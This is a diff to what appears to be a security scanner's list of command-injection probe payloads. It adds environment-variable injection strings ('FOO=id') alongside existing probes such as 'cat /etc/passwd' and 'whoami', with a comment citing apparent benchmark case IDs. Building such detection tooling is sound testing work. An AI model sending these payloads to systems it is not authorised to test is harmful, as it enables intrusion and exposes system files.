@@ -66,6 +66,12 @@ DEFAULT_PAYLOADS: list[tuple[str, str, str, str]] = [
     ("cmdi_bare_uname", "uname -a", "cmdi", "critical"),
     ("cmdi_bare_passwd", "cat /etc/passwd", "cmdi", "critical"),
     ("cmdi_bare_whoami", "whoami", "cmdi", "critical"),
+    # Env-var sink shape: target execs a fixed shell script that
+    # evaluates $FOO. Payload must be the env-entry string "FOO=<cmd>",
+    # not a URL-level shell metachar. Discovered on cmdi-00/495-497;
+    # see Amendment 15.
+    ("cmdi_env_marker", "FOO=echo JNSRY_MARK", "cmdi", "critical"),
+    ("cmdi_env_id", "FOO=id", "cmdi", "critical"),
 ]
 
 DEFAULT_USER_AGENT = (
